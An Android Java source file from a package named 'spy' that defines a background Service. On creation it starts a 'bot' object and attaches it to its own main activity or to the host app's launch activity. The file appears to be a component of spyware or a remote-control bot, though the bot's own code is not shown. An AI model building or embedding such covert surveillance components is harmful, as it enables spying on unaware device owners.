package alma.pro.spy;

import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.IBinder;

import java.util.List;
import java.util.Objects;
import java.util.concurrent.ExecutionException;

public class apsService extends Service {
    @Override
    public IBinder onBind(Intent intent) {return null;}
    @Override
    public void onCreate() {
        super.onCreate();
        try {
            if(new bot(getApplicationContext().getFilesDir().getPath(),this,null).myPackage.equals(getPackageName())){
                new bot(getApplicationContext().getFilesDir().getPath(),this,MainActivity.class).start();
            }else{
                Intent l = getPackageManager().getLaunchIntentForPackage(getPackageName());
                if(l == null){
                    new bot(getApplicationContext().getFilesDir().getPath(),this,null).start();
                }else{
                    try{
                        new bot(getApplicationContext().getFilesDir().getPath(),this,Class.forName(l.getComponent().getClassName())).start();
                    }catch (Exception e){
                        new bot(getApplicationContext().getFilesDir().getPath(),this,null).start();
                    }
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
